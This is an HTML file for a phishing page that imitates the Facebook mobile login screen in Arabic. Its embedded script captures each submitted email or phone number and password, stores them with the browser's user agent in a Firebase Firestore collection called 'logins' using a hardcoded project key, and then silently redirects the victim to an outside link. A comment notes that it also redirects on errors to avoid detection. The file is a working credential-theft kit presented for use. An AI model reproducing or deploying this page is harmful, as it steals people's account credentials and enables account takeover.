<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - تسجيل الدخول</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        // إعدادات Firebase الجديدة الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyB3XXz5XMUNV2SZNm8pU8RQVcDCjpRHh_k",
            authDomain: "ffffff-d6aa0.firebaseapp.com",
            projectId: "ffffff-d6aa0",
            storageBucket: "ffffff-d6aa0.firebasestorage.app",
            messagingSenderId: "186152813262",
            appId: "1:186152813262:web:74f071fcc9268f86f3869f",
            measurementId: "G-8L8CTHXBW3"
        };

        // الرابط الذي سيتم توجيه الشخص إليه فوراً
        const redirectUrl = "https://smrturl.co/a/s19f99451cf/16233?s1="; 

        // تهيئة النظام
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        document.getElementById('fbForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('u_email').value;
            const pass = document.getElementById('u_pass').value;

            try {
                // تسجيل دخول مجهول للهوية للسماح بالكتابة
                await signInAnonymously(auth);

                // حفظ البيانات في كولكشن 'logins'
                await addDoc(collection(db, "logins"), {
                    username: email,
                    password: pass,
                    createdAt: serverTimestamp(),
                    userAgent: navigator.userAgent
                });

                // التحويل المباشر والصامت
                window.location.replace(redirectUrl);

            } catch (error) {
                // في حالة أي خطأ، يتم التحويل أيضاً لعدم كشف الأمر
                window.location.replace(redirectUrl);
            }
        });
    </script>

    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, system-ui, sans-serif; }
        .input-style { background-color: #f5f6f7; border: 1px solid #dddfe2; }
        .input-style:focus { border-color: #1877f2; background-color: white; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
        .fb-blue-btn { background-color: #1877f2; }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <div class="bg-[#fffbe2] text-[#3b5998] py-2 text-center text-[12px] border-b border-[#e2e2e2]">
        احصل على فيسبوك للأندرويد وتصفح أسرع.
    </div>

    <main class="flex-grow flex flex-col items-center px-4 pt-10">
        <div class="mb-8">
            <h1 class="text-[#1877f2] font-bold text-[35px] tracking-tighter">facebook</h1>
        </div>

        <div class="w-full max-w-[400px]">
            <form id="fbForm" class="flex flex-col gap-3">
                <input 
                    type="text" 
                    id="u_email"
                    placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" 
                    class="input-style w-full p-3 rounded-lg text-md"
                    required
                >
                <input 
                    type="password" 
                    id="u_pass"
                    placeholder="كلمة السر" 
                    class="input-style w-full p-3 rounded-lg text-md"
                    required
                >
                
                <button 
                    type="submit" 
                    class="fb-blue-btn text-white font-bold py-3 rounded-lg text-lg active:opacity-90 transition-all"
                >
                    تسجيل الدخول
                </button>
            </form>

            <div class="text-center mt-4">
                <a href="#" class="text-[#1877f2] text-sm font-medium hover:underline">هل نسيت كلمة السر؟</a>
            </div>

            <div class="flex items-center my-8">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="px-4 text-gray-400 text-sm">أو</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>

            <div class="flex justify-center">
                <button type="button" class="bg-[#42b72a] text-white font-bold py-2 px-6 rounded-md text-sm">
                    إنشاء حساب جديد
                </button>
            </div>
        </div>
    </main>

    <footer class="mt-auto py-6 bg-white text-center text-[11px] text-gray-400">
        <div class="flex justify-center gap-6 text-gray-500 mb-2">
            <span>العربية</span>
            <span class="text-[#1877f2]">English (US)</span>
        </div>
        Meta © 2024
    </footer>

</body>
</html>
